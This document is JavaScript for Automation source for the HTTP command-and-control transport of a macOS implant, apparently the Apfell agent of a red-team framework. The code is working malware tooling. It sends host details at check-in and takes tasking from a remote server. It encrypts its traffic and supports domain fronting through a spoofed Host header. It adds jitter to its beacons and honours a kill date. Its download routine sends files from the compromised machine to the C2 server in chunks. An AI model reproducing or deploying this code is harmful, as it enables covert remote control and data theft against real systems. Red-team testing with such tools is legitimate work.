//-------------RESTFUL C2 mechanisms ---------------------------------
class customC2 extends baseC2{
	constructor(interval, cback_host, cback_port){
		if(cback_port === "443" && cback_host.includes("https://")){
			super(interval, cback_host);
		}else if(cback_port === "80" && cback_host.includes("http://")){
			super(interval, cback_host);
		}else{
			let last_slash = cback_host.indexOf("/", 8);
			if(last_slash === -1){
				//there is no 3rd slash
				super(interval, cback_host + ":" + cback_port);
			}else{
				//there is a 3rd slash, so we need to splice in the port
				super(interval,cback_host.substring(0, last_slash) + ":" + cback_port + "/" + cback_host.substring(last_slash))
			}
		}
		this.commands = [];
		this.url = this.baseurl;
		this.jitter = callback_jitter;
		this.host_header = "domain_front";
		this.user_agent = "USER_AGENT";
		this.aes_psk = "AESPSK"; // base64 encoded key
		if(this.aes_psk !== ""){
		    this.parameters = $.CFDictionaryCreateMutable($.kCFAllocatorDefault, 0, $.kCFTypeDictionaryKeyCallBacks, $.kCFTypeDictionaryValueCallBacks);
		    $.CFDictionarySetValue(this.parameters, $.kSecAttrKeyType, $.kSecAttrKeyTypeAES);
		    $.CFDictionarySetValue(this.parameters, $.kSecAttrKeySizeInBits, $.kSecAES256);
		    $.CFDictionarySetValue(this.parameters, $.kSecAttrKeyClass, $.kSecAttrKeyClassSymmetric);
		    $.CFDictionarySetValue(this.parameters, $.kSecClass, $.kSecClassKey);
            this.raw_key = $.NSData.alloc.initWithBase64Encoding(this.aes_psk);
            let err = Ref();
            this.cryptokey = $.SecKeyCreateFromData(this.parameters, this.raw_key, err);
		}
        this.using_key_exchange = "encrypted_exchange_check" === "T";
		this.exchanging_keys = this.using_key_exchange;
		if("killdate" !== "yyyy-mm-dd" && "killdate" !== ""){
			this.dateFormatter = $.NSDateFormatter.alloc.init;
        	this.dateFormatter.setDateFormat("yyyy-MM-dd");
        	this.kill_date = this.dateFormatter.dateFromString('killdate');
		}else{
			this.kill_date = $.NSDate.distantFuture;
		}
	}
	get_random_int(max) {
        return Math.floor(Math.random() * Math.floor(max + 1));
    }
    gen_sleep_time(){
      //generate a time that's this.interval += (this.interval * 1/this.jitter)
      if(this.jitter < 1){return this.interval;}
      let plus_min = this.get_random_int(1);
      if(plus_min === 1){
          return this.interval + (this.interval * (this.get_random_int(this.jitter)/100));
      }else{
          return this.interval - (this.interval * (this.get_random_int(this.jitter)/100));
      }
    }
	encrypt_message(uid, data){
	    // takes in the string we're about to send, encrypts it, and returns a new string
	    let err = Ref();
	    let encrypt = $.SecEncryptTransformCreate(this.cryptokey,err);
	    let b = $.SecTransformSetAttribute(encrypt, $("SecPaddingKey"), $("SecPaddingPKCS7Key"), err);
	    b= $.SecTransformSetAttribute(encrypt, $("SecEncryptionMode"), $("SecModeCBCKey"), err);

        //generate a random IV to use
	    let IV = $.NSMutableData.dataWithLength(16);
	    $.SecRandomCopyBytes($.kSecRandomDefault, 16, IV.bytes);
	    b = $.SecTransformSetAttribute(encrypt, $("SecIVKey"), IV, err);
	    // set our data to be encrypted
	    let nsdata = $(data).dataUsingEncoding($.NSUTF8StringEncoding);
        b=$.SecTransformSetAttribute(encrypt, $.kSecTransformInputAttributeName, nsdata, err);
        //$.CFShow(err[0]);
        let encryptedData = $.SecTransformExecute(encrypt, err);
        // now we need to prepend the IV to the encrypted data before we base64 encode and return it
        //generate the hmac
	    let hmac_transform = $.SecDigestTransformCreate($("HMAC-SHA2 Digest Family"), 256, err);
	    let hmac_input = $.NSMutableData.dataWithLength(0);
	    hmac_input.appendData(IV);
	    hmac_input.appendData(encryptedData);
		b=$.SecTransformSetAttribute(hmac_transform, $.kSecTransformInputAttributeName, hmac_input, err);
		b=$.SecTransformSetAttribute(hmac_transform, $.kSecDigestHMACKeyAttribute, $.NSData.alloc.initWithBase64Encoding(this.aes_psk), err);
		let hmac_data = $.SecTransformExecute(hmac_transform, err);

        let final_message = $.NSMutableData.dataWithLength(0);
        final_message.appendData( $(uid).dataUsingEncoding($.NSUTF8StringEncoding) );
        final_message.appendData(IV);
        final_message.appendData(encryptedData);
        final_message.appendData(hmac_data);
        return final_message.base64EncodedStringWithOptions(0);
	}
	decrypt_message(nsdata){
        //takes in a base64 encoded string to be decrypted and returned
        //console.log("called decrypt");
        let err = Ref();
        let decrypt = $.SecDecryptTransformCreate(this.cryptokey, err);
        $.SecTransformSetAttribute(decrypt, $("SecPaddingKey"), $("SecPaddingPKCS7Key"), err);
	    $.SecTransformSetAttribute(decrypt, $("SecEncryptionMode"), $("SecModeCBCKey"), err);
	    //console.log("making ranges");
        //need to extract out the first 16 bytes as the IV and the rest is the message to decrypt
        let iv_range = $.NSMakeRange(0, 16);
        let message_range = $.NSMakeRange(16, nsdata.length - 48); // 16 for IV 32 for hmac
        let hmac_range = $.NSMakeRange(nsdata.length - 32, 32);
        let hmac_data_range = $.NSMakeRange(0, nsdata.length - 32); // hmac includes IV + ciphertext
        //console.log("carving out iv");
        let iv = nsdata.subdataWithRange(iv_range);
        $.SecTransformSetAttribute(decrypt, $("SecIVKey"), iv, err);
        let message = nsdata.subdataWithRange(message_range);
        $.SecTransformSetAttribute(decrypt, $("INPUT"), message, err);
        // create an hmac and verify it matches
        let message_hmac = nsdata.subdataWithRange(hmac_range);
        let hmac_transform = $.SecDigestTransformCreate($("HMAC-SHA2 Digest Family"), 256, err);
		$.SecTransformSetAttribute(hmac_transform, $.kSecTransformInputAttributeName, nsdata.subdataWithRange(hmac_data_range), err);
		$.SecTransformSetAttribute(hmac_transform, $.kSecDigestHMACKeyAttribute, $.NSData.alloc.initWithBase64Encoding(this.aes_psk), err);
		let hmac_data = $.SecTransformExecute(hmac_transform, err);
		if(hmac_data.isEqualToData(message_hmac)){
			let decryptedData = $.SecTransformExecute(decrypt, Ref());
	        //console.log("making a string from the message");
	        let decrypted_message = $.NSString.alloc.initWithDataEncoding(decryptedData, $.NSUTF8StringEncoding);
	        //console.log(decrypted_message.js);
	        return decrypted_message;
		}
		else{
			return undefined;
		}
	}
	negotiate_key(){
        // Generate a public/private key pair
        let parameters = $({"type": $("42"), "bsiz": 4096, "perm": false});
        let err = Ref();
        let privatekey = $.SecKeyCreateRandomKey(parameters, err);
        //console.log("generated new key");
        let publickey = $.SecKeyCopyPublicKey(privatekey);
        let exported_public = $.SecKeyCopyExternalRepresentation(publickey, err);
        //$.CFShow($.CFMakeCollectable(err[0]));
        try{
        	//this is the catalina case
        	let b64_exported_public = $.CFMakeCollectable(exported_public);
        	b64_exported_public = b64_exported_public.base64EncodedStringWithOptions(0).js; // get a base64 encoded string version
        	exported_public = b64_exported_public;
        }catch(error){
        	//this is the mojave and high sierra case
        	exported_public = exported_public.base64EncodedStringWithOptions(0).js;
        }
        let s = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
	    let session_key = Array(20).join().split(',').map(function() { return s.charAt(Math.floor(Math.random() * s.length)); }).join('');
	    let initial_message = {"session_id": session_key, "pub_key": exported_public, "action": "staging_rsa"};
	    // Encrypt our initial message with sessionID and Public key with the initial AES key
	    while(true){
	        try{
	        	let stage1 = this.htmlPostData(initial_message, apfell.uuid);
	        	let enc_key = $.NSData.alloc.initWithBase64Encoding(stage1['session_key']);
                let dec_key = $.SecKeyCreateDecryptedData(privatekey, $.kSecKeyAlgorithmRSAEncryptionOAEPSHA1, enc_key, err);
                // Adjust our global key information with the newly adjusted session key
				try{
					this.aes_psk = dec_key.base64EncodedStringWithOptions(0).js; // base64 encoded key
				}catch(error){
					let dec_key_collectable = $.CFMakeCollectable(dec_key);
					dec_key_collectable = dec_key_collectable.base64EncodedStringWithOptions(0).js;
					this.aes_psk = dec_key_collectable;
				}
                //console.log(JSON.stringify(json_response));
                this.parameters = $({"type": $.kSecAttrKeyTypeAES});
                this.raw_key = $.NSData.alloc.initWithBase64Encoding(this.aes_psk);
                this.cryptokey = $.SecKeyCreateFromData(this.parameters, this.raw_key, Ref());
                this.exchanging_keys = false;
                return stage1['uuid'];
            }catch(error){
            	console.log(error.toString());
                $.NSThread.sleepForTimeInterval(this.gen_sleep_time());  // don't spin out crazy if the connection fails
            }
        }
	}
	getConfig(){
		//A RESTful base config consists of the following:
		//  BaseURL (includes Port), CallbackInterval, KillDate (not implemented yet)
        let config = {
            "C2": {
                "baseurl": this.baseurl,
                "interval": this.interval,
                "jitter": this.jitter,
                "commands": this.commands.join(", "),
                "api_version": this.api_version,
                "host_header": this.host_header,
                "aes_psk": this.aes_psk
            },
            "Host": {
                "user": apfell.user,
                "fullName": apfell.fullName,
                "ips": apfell.ip,
                "hosts": apfell.host,
                "environment": apfell.environment,
                "uptime": apfell.uptime,
                "args": apfell.args,
                "pid": apfell.pid,
                "apfell_id": apfell.id,
                "payload_id": apfell.uuid
            }};
		return JSON.stringify(config, null, 2);
	}
	checkin(ip, pid, user, host, os, arch){
		//get info about system to check in initially
		//needs IP, PID, user, host, payload_type
		let info = {'ip':ip,'pid':pid,'user':user,'host':host,'uuid':apfell.uuid, "os":os, "architecture": arch, "action": "checkin"};
		if(user === "root"){
		    info['integrity_level'] = 3;
		}
		//calls htmlPostData(url,data) to actually checkin
		//Encrypt our data
		//gets back a unique ID
        if(this.using_key_exchange){
            let sessionID = this.negotiate_key();
            //console.log("got session ID: " + sessionID);
            var jsondata = this.htmlPostData(info, sessionID);
        }else{
            var jsondata = this.htmlPostData(info, apfell.uuid);
        }
		apfell.id = jsondata.id;
		// if we fail to get a new ID number, then exit the application
		if(apfell.id === undefined){ $.NSApplication.sharedApplication.terminate(this); }
		//console.log(apfell.id);
		return jsondata;
	}
	getTasking(){
		while(true){
		    try{
		        //let data = {"tasking_size":1, "action": "get_tasking"};
		        //let task = this.htmlPostData(this.url, data, apfell.id);
				let task = this.htmlGetData();
		        //console.log("tasking got back: " + JSON.stringify(task));
		        return task['tasks'];
		    }
		    catch(error){
		    	//console.log(error.toString());
		        $.NSThread.sleepForTimeInterval(this.gen_sleep_time());  // don't spin out crazy if the connection fails
		    }
		}
	}
	postResponse(task, output){
	    // this will get the task object and the response output
	    return this.postRESTResponse(output, task.id);
	}
	postRESTResponse(data, tid){
		//depending on the amount of data we're sending, we might need to chunk it
		data["task_id"] =  tid;
		let postData = {"action": "post_response", "responses": [data]};
		return this.htmlPostData(postData, apfell.id);
	}
	htmlPostData(sendData, uid, json=true){
	    let url = this.baseurl;
        //console.log(url);
        //encrypt our information before sending it
		let data;
        if(this.aes_psk !== ""){
            data = this.encrypt_message(uid, JSON.stringify(sendData));
        }else if(typeof(sendData) === "string"){
        	data = $(uid + sendData).dataUsingEncoding($.NSUTF8StringEncoding);
            data = data.base64EncodedStringWithOptions(0);
        }else{
        	data = $(uid + JSON.stringify(sendData)).dataUsingEncoding($.NSUTF8StringEncoding);
            data = data.base64EncodedStringWithOptions(0);
		}
		while(true){
			try{ //for some reason it sometimes randomly fails to send the data, throwing a JSON error. loop to fix for now
				//console.log("posting: " + sendData + " to " + urlEnding);
				if( $.NSDate.date.compare(this.kill_date) === $.NSOrderedDescending ){
				  $.NSApplication.sharedApplication.terminate(this);
				}
				if( (apfell.id === undefined || apfell.id === "") && (uid === undefined || uid === "")){ $.NSApplication.sharedApplication.terminate(this);}
				let req = $.NSMutableURLRequest.alloc.initWithURL($.NSURL.URLWithString(url));
				req.setHTTPMethod($.NSString.alloc.initWithUTF8String("POST"));
				let postData = data.dataUsingEncodingAllowLossyConversion($.NSString.NSASCIIStringEncoding, true);
				let postLength = $.NSString.stringWithFormat("%d", postData.length);
				req.addValueForHTTPHeaderField(postLength, $.NSString.alloc.initWithUTF8String('Content-Length'));
				if( this.host_header.length > 0){
				    req.setValueForHTTPHeaderField($.NSString.alloc.initWithUTF8String(this.host_header), $.NSString.alloc.initWithUTF8String("Host"));
				}
				if (this.user_agent.length > 0){
					req.setValueForHTTPHeaderField($.NSString.alloc.initWithUTF8String(this.user_agent), $.NSString.alloc.initWithUTF8String("User-Agent"));
				}
				req.setHTTPBody(postData);
				let response = Ref();
				let error = Ref();
				let responseData = $.NSURLConnection.sendSynchronousRequestReturningResponseError(req,response,error);
				//responseData is base64(UUID + data)
				if( responseData.length < 36){
					$.NSThread.sleepForTimeInterval(this.gen_sleep_time());
			    	continue;
				}
				let resp = $.NSData.alloc.initWithBase64Encoding(responseData);
				//let uuid_range = $.NSMakeRange(0, 36);
		        let message_range = $.NSMakeRange(36, resp.length - 36);
		        //let uuid = $.NSString.alloc.initWithDataEncoding(resp.subdataWithRange(uuid_range), $.NSUTF8StringEncoding).js;
		        resp = resp.subdataWithRange(message_range); //could either be plaintext json or encrypted bytes
				//we're not doing the initial key exchange
				if(this.aes_psk !== ""){
					//if we do need to decrypt the response though, do that
					if(json){
						resp = ObjC.unwrap(this.decrypt_message(resp));
						return JSON.parse(resp);
					}else{
						return this.decrypt_message(resp);
					}
				}else{
					//we don't need to decrypt it, so we can just parse and return it
					if(json){
						return JSON.parse(ObjC.deepUnwrap($.NSString.alloc.initWithDataEncoding(resp, $.NSUTF8StringEncoding)));
					}else{
						return $.NSString.alloc.initWithDataEncoding(resp, $.NSUTF8StringEncoding).js;
					}
				}
			}
			catch(error){
				//console.log(error.toString());
			    $.NSThread.sleepForTimeInterval(this.gen_sleep_time());  // don't spin out crazy if the connection fails
			}
		}
	}
	htmlGetData(){
		let data = {"tasking_size":1, "action": "get_tasking"};
		if(this.aes_psk !== ""){
			data = this.encrypt_message(apfell.id, JSON.stringify(data)).js;
		}else{
			data = $(apfell.id + JSON.stringify(data)).dataUsingEncoding($.NSUTF8StringEncoding);
			data = data.base64EncodedStringWithOptions(0).js;
		}
		let NSCharacterSet = $.NSCharacterSet.characterSetWithCharactersInString("/+=\n").invertedSet;
		data = $(data).stringByAddingPercentEncodingWithAllowedCharacters(NSCharacterSet).js;
		let url = this.baseurl + "?q=" + data;
	    while(true){
	        try{
	        	if( $.NSDate.date.compare(this.kill_date) === $.NSOrderedDescending ){
				  $.NSApplication.sharedApplication.terminate(this);
				}
	        	if(apfell.id === undefined || apfell.id === ""){ $.NSApplication.sharedApplication.terminate(this);}
	            let req = $.NSMutableURLRequest.alloc.initWithURL($.NSURL.URLWithString(url));
                req.setHTTPMethod($.NSString.alloc.initWithUTF8String("GET"));
                if( this.host_header.length > 0){
                    req.setValueForHTTPHeaderField($.NSString.alloc.initWithUTF8String(this.host_header), $.NSString.alloc.initWithUTF8String("Host"));
                }
                if (this.user_agent.length > 0){
					req.setValueForHTTPHeaderField($.NSString.alloc.initWithUTF8String(this.user_agent), $.NSString.alloc.initWithUTF8String("User-Agent"));
				}
                let response = Ref();
                let error = Ref();
                let responseData = $.NSURLConnection.sendSynchronousRequestReturningResponseError(req,response,error);
				if(responseData.length < 36){
                    //this means we likely got back some form of error or redirect message, not our actual data
                    $.NSThread.sleepForTimeInterval(this.gen_sleep_time());
                    continue;
                }
				let resp = $.NSData.alloc.initWithBase64Encoding(responseData);
				//let uuid_range = $.NSMakeRange(0, 36);
		        let message_range = $.NSMakeRange(36, resp.length - 36);
		        //let uuid = $.NSString.alloc.initWithDataEncoding(resp.subdataWithRange(uuid_range), $.NSUTF8StringEncoding).js;
		        resp = resp.subdataWithRange(message_range); //could either be plaintext json or encrypted bytes
				//we're not doing the initial key exchange
				if(this.aes_psk !== ""){
					//if we do need to decrypt the response though, do that
					resp = ObjC.unwrap(this.decrypt_message(resp));
					return JSON.parse(resp);
				}else{
					//we don't need to decrypt it, so we can just parse and return it
					return JSON.parse(ObjC.deepUnwrap($.NSString.alloc.initWithDataEncoding(resp, $.NSUTF8StringEncoding)));
				}
	        }
	        catch(error){
	            //console.log("error in htmlGetData: " + error.toString());
	            $.NSThread.sleepForTimeInterval(this.gen_sleep_time()); //wait timeout seconds and try again
	        }
	    }
	}
	download(task, params){
        // download just has one parameter of the path of the file to download
        let output = "";
		if( does_file_exist(params) ){
            let offset = 0;
            let chunkSize = 512000; //3500;
            // get the full real path to the file
            let full_path = params;
            try{
            	let fm = $.NSFileManager.defaultManager;
            	let pieces = ObjC.deepUnwrap(fm.componentsToDisplayForPath(params));
            	full_path = "/" + pieces.slice(1).join("/");
                var handle = $.NSFileHandle.fileHandleForReadingAtPath(full_path);
                // Get the file size by seeking;
                var fileSize = handle.seekToEndOfFile;
            }catch(error){
                return {'status': 'error', 'user_output': error.toString(), 'completed': true};
            }
            // always round up to account for chunks that are < chunksize;
            let numOfChunks = Math.ceil(fileSize / chunkSize);
            let registerData = {'total_chunks': numOfChunks, 'full_path': full_path};
            let registerFile = this.postResponse(task, registerData);
            registerFile = registerFile['responses'][0];
            if (registerFile['status'] === "success"){
                handle.seekToFileOffset(0);
                let currentChunk = 1;
                let data = handle.readDataOfLength(chunkSize);
                while(parseInt(data.length) > 0 && offset < fileSize){
                    // send a chunk
                    let fileData = {'chunk_num': currentChunk, 'chunk_data': data.base64EncodedStringWithOptions(0).js,'file_id': registerFile['file_id']};
                    this.postResponse(task, fileData);
                    $.NSThread.sleepForTimeInterval(this.gen_sleep_time());
                    // increment the offset and seek to the amount of data read from the file
                    offset += parseInt(data.length);
                    handle.seekToFileOffset(offset);
                    currentChunk += 1;
                    data = handle.readDataOfLength(chunkSize);
                }
                output = {"completed":true, "file_id": registerFile['file_id']};
            }
            else{
               output = {'status': 'error', 'user_output': "Failed to register file to download", 'completed': true};
            }
        }
        else{
            output = {'status': 'error', 'user_output': "file does not exist", 'completed': true};
        }
        return output;
	}
	upload(task, file_id, full_path){
	    try{
            let data = {"action": "upload", "file_id": file_id, "chunk_size": 512000, "chunk_num": 1, "full_path": full_path, "task_id": task.id};
            let chunk_num = 1;
            let total_chunks = 1;
            let total_data = $.NSMutableData.dataWithLength(0);
            do{
            	let file_data = this.htmlPostData(data, apfell.id);
            	if(file_data['chunk_num'] === 0){
            		return "error from server";
            	}
            	chunk_num = file_data['chunk_num'];
            	total_chunks = file_data['total_chunks'];
            	total_data.appendData($.NSData.alloc.initWithBase64Encoding($(file_data['chunk_data'])));
            	data = {"action": "upload", "file_id": file_id, "chunk_size": 512000, "chunk_num": chunk_num + 1, "task_id": task.id};
            }while(chunk_num < total_chunks);
            return total_data;
	    }catch(error){
	        return error.toString();
	    }
	}
}
//------------- INSTANTIATE OUR C2 CLASS BELOW HERE IN MAIN CODE-----------------------
ObjC.import('Security');
var C2 = new customC2(callback_interval, "callback_host", "callback_port");